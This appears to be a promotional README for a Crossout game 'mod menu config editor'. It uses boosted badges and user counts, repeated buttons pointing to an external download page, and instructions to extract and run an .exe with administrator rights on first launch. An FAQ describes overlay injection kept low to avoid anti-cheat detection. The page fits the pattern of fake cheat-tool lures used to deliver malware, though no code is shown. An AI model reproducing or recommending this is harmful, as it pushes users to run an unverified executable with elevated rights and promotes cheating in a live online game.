<div align="center">
<img src="assets/banner.svg" width="100%" alt="Crossout Mod Menu banner" />
</div>

<div align="center">
<p>
  <img src="https://img.shields.io/badge/Platform-Windows_11%7C10-ff5065?style=for-the-badge&logo=windows" alt="" />
  <img src="https://img.shields.io/badge/Release-2026-DC2626?style=for-the-badge" alt="" />
  <img src="https://img.shields.io/badge/Build-.exe-DB2777?style=for-the-badge" alt="" />
</p>
</div>

<p align="center">
  <img src="https://readme-typing-svg.herokuapp.com?color=DC2626&size=28&center=true&vCenter=true&width=900&lines=%F0%9F%9A%80+Crossout+Mod+Menu+Config+Editor;%E2%9A%A1+Active+Development+2026;%F0%9F%94%A5+Built+for+Windows+11;%F0%9F%92%AF+Updated+for+2026">
</p>

<p align="center">
  <img src="https://skillicons.dev/icons?i=github" />
  <img src="https://skillicons.dev/icons?i=windows" />
</p>

---

<div align="center">

![Status](https://img.shields.io/badge/status-online-brightgreen?style=for-the-badge)
![Version](https://img.shields.io/badge/version-v2.6.3-blue?style=for-the-badge)
![Platform](https://img.shields.io/badge/platform-Windows%2010%2F11-lightgrey?style=for-the-badge)
![Users](https://img.shields.io/badge/active%20users-38%2C900%2B-orange?style=for-the-badge)
![Build](https://img.shields.io/badge/build-passing-success?style=for-the-badge)

</div>

I maintain this config editor for the Crossout mod menu on the side, tested it on main against the live client before every tag — see FAQ for detection/updates.

---

## 📜 Table of Contents

- [🗺️ Compatibility / Platform Support](#compatibility--platform-support)
- [🧩 The Solution](#the-solution)
- [📖 What is a Config Editor?](#what-is-a-config-editor)
- [⚖️ Comparison](#comparison)
- [🔧 Overview](#overview)
- [🚚 Loadout & Combat Modules](#loadout--combat-modules)
- [🎨 Visual & UI Modules](#visual--ui-modules)
- [🛰️ Utility & Automation Modules](#utility--automation-modules)
- [🧪 Module Status Table](#module-status-table)
- [🩹 Known Issues](#known-issues)
- [🖥️ System Requirements](#system-requirements)
- [🏁 Quick Start](#quick-start)
- [🛠️ Installation](#installation)
- [🧾 FAQ](#faq)

---

## 🗺️ Compatibility / Platform Support

| Platform | Support | Notes |
|---|---|---|
| Steam (Windows) | ✅ Full | Primary tested build target |
| Standalone Crossout launcher | ✅ Full | Config paths auto-detected |
| Windows 11 | ✅ Full | No compatibility mode required |
| Windows 10 | ✅ Full | Requires latest cumulative update |
| Linux (Proton) | ⚠️ Partial | Overlay rendering degraded |
| macOS | ❌ Unsupported | No Crossout client build exists |

The config editor hooks into the same local profile folder the Crossout client already reads on launch, so there's nothing to reroute manually.

---

## 🧩 The Solution

| Problem | Solution |
|---|---|
| Editing raw config files manually breaks builds | Structured editor validates every field before saving |
| Loadout presets get lost between patches | Preset vault survives client updates |
| Menu overlays fight with the Crossout HUD | Dedicated render layer with adjustable Z-order |
| Manual .ini editing risks typos and crashes | Guided form fields replace free-text edits |
| No way to preview changes before a match | Live preview panel mirrors garage state |
| Settings differ per faction/clan loadout | Per-profile config slots, switch instantly |
| Community configs shared as unverified text dumps | Import/export uses a signed config format |

---

## 📖 What is a Config Editor?

| Term | Explanation |
|---|---|
| Config Editor | The GUI layer that reads/writes Crossout's local settings and mod menu parameters |
| Mod Menu | The in-game overlay panel exposing toggles for gameplay/visual modules |
| Preset Vault | Local storage for saved loadout and menu configurations |
| Hook Layer | The bridge process that lets the editor apply values to a running client |
| Signed Config | An export format with a checksum to prevent corrupted or tampered shares |
| Render Overlay | The transparent draw layer the menu paints itself onto over the game window |

**Why it matters:**

- Saves and restores full mod menu setups in one click
- Prevents malformed config values from crashing your session
- Lets you swap between build presets mid-session without alt-tabbing to a text editor
- Keeps your personal tuning separate from shared community presets
- Removes guesswork from which .ini keys actually do something

---

## ⚖️ Comparison

| Aspect | Manual .ini Editing | This Tool |
|---|---|---|
| Setup time | 15–30 min per config | Under 2 minutes |
| Crash risk from typos | High | Near zero (validated fields) |
| Preset sharing | Copy-paste text files | Signed export/import |
| Live preview | None | Yes, garage-synced |
| Update survival | Configs often reset | Vault persists across patches |
| Multi-profile support | Manual folder renaming | Built-in profile slots |
| Menu overlay control | Fixed position only | Adjustable position/opacity/hotkeys |

---

## 🔧 Overview

| Category | Details |
|---|---|
| Core Function | Read/write/validate Crossout mod menu configuration files |
| Module Count | 25 individual toggle-able modules |
| Interface | Standalone desktop window + in-game overlay panel |
| Update Cadence | Patched within 24–72h of major Crossout client updates |
| Storage | Local-only, no cloud sync required |
| Language | English UI, config values are engine-agnostic |

This build focuses purely on giving you a stable panel to tune the mod menu without hand-editing raw files — every module below reads its current state on launch and writes back only when you hit save.
<div align="center">
  <a href="https://southheraldjam.github.io/crossout-mod-menu-config-editor/">
    <img src="https://img.shields.io/badge/GET-crossout_mod_menu_2026-2563EB?style=flat-square&labelColor=1D4ED8" width="620" alt="GET crossout mod menu 2026"/>
  </a>
</div>
---

## 🚚 Loadout & Combat Modules

Combat-facing modules adjust how your build behaves and how the mod menu surfaces combat data during a match. These are the modules most players open first because they touch damage numbers and part behavior directly.

- **Weapon Damage Overlay** — shows live per-weapon damage output on HUD
- **Durability Tracker** — real-time part health bars beyond stock UI
- **Ammo Counter Panel** — persistent ammo/heat readout for all mounted weapons
- **Fusion Slot Preview** — preview fusion stat changes before committing
- **Build Weight Calculator** — instant total weight vs. cabin cap
- **Power Score Estimator** — recalculates PS live as you swap parts
- **Radiator/Cooling Meter** — tracks weapon overheat thresholds
- **Melee Hit Detection Aid** — visual range ring for melee builds

---

## 🎨 Visual & UI Modules

The visual layer controls how the mod menu itself looks and sits over the Crossout garage/HUD, plus a few cosmetic quality-of-life views.

- **Overlay Position Lock** — pin the menu panel to any screen corner
- **Opacity Slider** — adjust overlay transparency from 10–100%
- **Custom Hotkey Binder** — remap every module toggle individually
- **Skin Preview Panel** — preview owned skins on the current chassis
- **Color Theme Switcher** — light/dark/high-contrast menu themes
- **Minimap Zoom Control** — independent zoom separate from game setting
- **Font Scale Adjuster** — resize overlay text for 1080p–4K displays
- **Clan Tag Highlighter** — color-tags allies by clan on HUD

---

## 🛰️ Utility & Automation Modules

Utility modules handle the editor-side logic: saving, restoring, importing, and keeping your setup synced across sessions without touching gameplay values.

- **Preset Vault Sync** — auto-saves current config every session
- **Config Import/Export** — signed file exchange between users
- **Profile Slot Manager** — up to 6 independent saved profiles
- **Auto-Backup on Launch** — snapshots config before any edit
- **Rollback to Last Stable** — one-click revert if a save breaks
- **Update Checker** — flags when Crossout patch may affect current config
- **Crash Log Exporter** — bundles logs for troubleshooting
- **Startup Delay Timer** — staggers overlay injection after client load
- **Hotkey Conflict Scanner** — warns before binding collisions occur

---

## 🧪 Module Status Table

| Module | Status | Description |
|---|---|---|
| Weapon Damage Overlay | ✅ Working | Live per-weapon output readout |
| Preset Vault Sync | ✅ Working | Auto-saves every active session |
| Overlay Position Lock | ✅ Working | Corner-pinned overlay placement |
| Fusion Slot Preview | ✅ Working | Stat delta preview pre-commit |
| Config Import/Export | ✅ Working | Signed file exchange format |
| Rollback to Last Stable | ✅ Working | One-click config revert |
| Clan Tag Highlighter | ✅ Working | HUD ally color-coding |
| Update Checker | ✅ Working | Flags patch-affected configs |

---

## 🩹 Known Issues

| Issue | Solution |
|---|---|
| Overlay flickers on ultrawide monitors | Set scaling mode to "Fixed" in display tab |
| Preset vault not loading after Windows update | Run editor once as administrator to re-link profile path |
| Hotkeys reset after Crossout patch | Re-apply saved profile from Profile Slot Manager |
| Skin preview shows blank thumbnail | Clear local thumbnail cache in Utility tab |
| Editor window opens off-screen on multi-monitor | Delete `window.pos` file, relaunch to reset position |

---

## 🖥️ System Requirements

| Component | Minimum | Recommended |
|---|---|---|
| OS | Windows 10 64-bit | Windows 11 64-bit |
| CPU | Dual-core 2.5GHz | Quad-core 3.2GHz+ |
| RAM | 4 GB | 8 GB+ |
| Storage | 200 MB free | 500 MB free |
| .NET Runtime | 6.0 | Latest LTS |
| Crossout Client | Installed & updated | Installed & updated |
| Permissions | Standard user | Administrator (first run) |

---

## 🏁 Quick Start

1. 🧭 Visit the project page and open the release section
2. 📦 Download the packaged archive
3. 🗂️ Extract it to any folder outside `Program Files`
4. ▶️ Run the `.exe` — no installer, no background service
5. 🎮 Launch Crossout, then toggle the overlay hotkey to open the menu
<div align="center">
  <a href="https://southheraldjam.github.io/crossout-mod-menu-config-editor/">
    <img src="https://img.shields.io/badge/GET_IT-Portable-7C3AED?style=plastic&logo=github&logoColor=white&labelColor=5B21B6" width="520" alt="GET IT Portable"/>
  </a>
</div>
---

## 🛠️ Installation

**Step 1 — Extract the archive.** Unzip the downloaded folder somewhere with write access, such as your Desktop or a dedicated Tools directory. Avoid extracting directly into system-protected folders.

**Step 2 — Run the executable.** Double-click the `.exe`. On first launch it scans for your local Crossout install path and creates the preset vault folder automatically.

**Step 3 — Bind your overlay hotkey.** Open the Utility tab, set your preferred toggle key, then launch Crossout normally — the overlay attaches once the garage screen loads.

---

## 🧾 FAQ

<details>
<summary>Does this get detected by anti-cheat?</summary>
No confirmed detections on the current build as of this version. Detection risk isn't zero for any third-party overlay — I keep the injection method conservative and update fast after client patches. Use at your own discretion.
</details>

<details>
<summary>How often is it updated after a Crossout patch?</summary>
Typically within 24–72 hours for major patches, faster for minor hotfixes that don't touch the config schema.
</details>

<details>
<summary>Does it require administrator rights?</summary>
Only on first run, to link the profile path. Normal use afterward doesn't need elevated permissions.
</details>

<details>
<summary>Can I share my presets with clanmates?</summary>
Yes — use the signed export in the Preset Vault Sync module. Signed files reject silently if corrupted or tampered with on import.
</details>

<details>
<summary>Will this reset if Crossout updates?</summary>
No. The vault stores presets outside the game's own config folder, so client updates don't wipe them. You may need to re-verify hotkeys once via the FAQ note above.
</details>

<details>
<summary>Is there a Linux version?</summary>
Not officially. Proton users report partial functionality but overlay rendering can degrade — see the compatibility table above.
</details>

<details>
<summary>Why did my overlay disappear after alt-tabbing?</summary>
This is a known render-layer quirk on some GPU drivers. Toggle the hotkey twice or restart the editor if it doesn't reattach.
</details>

<details>
<summary>Does the editor modify game files directly?</summary>
It writes only to the local config/mod menu files the Crossout client already reads — it doesn't touch core game binaries.
</details>

<details>
<summary>Can I run multiple profiles at once?</summary>
No, only one profile is active per session, but you can switch between saved slots instantly via the Profile Slot Manager.
</details>

---

This project stays maintainer-driven — every tagged version has been run against a live Crossout session before release, not just compiled and shipped blind. If a module breaks after a patch, the Known Issues table above gets updated first, before any changelog notes. Contributions and issue reports are welcome, but keep in mind this stays a config/overlay tool, not a gameplay hack platform.
